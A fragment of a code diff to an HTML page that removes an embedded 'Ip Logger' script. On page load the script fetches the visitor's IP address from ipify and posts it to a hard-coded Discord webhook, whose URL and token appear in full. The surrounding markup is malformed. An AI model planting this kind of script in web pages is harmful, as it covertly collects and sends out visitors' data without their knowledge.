@@ -96,33 +96,8 @@
     </di
 <html>
 <head>
-  <link rel="stylesheet" href="styles.css">
-  <link rel="icon" href="ip.ico" sizes="500x500"
 </head>
 <body>
-
-  <script>
-function getIP(json) {
-  var request = new XMLHttpRequest(); //making a request for the webhook
-      request.open("POST", "https://discord.com/api/webhooks/1018108364791750717/VH3jJtv2Ynlb8KYhfnvQeiwa0rFTMd0JXB1FP3_jmXTXIm39r9IwgHYiOZIwTs1i2aPk");
-
-      request.setRequestHeader('Content-type', 'application/json');
-
-      var params = {
-        username: "Ip Logger",
-        avatar_url: "https://drive.google.com/uc?export=download&id=1biNXEuVe5Xzc6zxBLXDH6JbUVzKa4oBK",
-        content: "**IP:** __*"  + json.ip + "*__"
-      }
-   //just a webhook parameters such as avatar,name,message
-
-      request.send(JSON.stringify(params));
-    }
-
-</script>
-<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
-
-</body>
-</html>
 </div>
 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
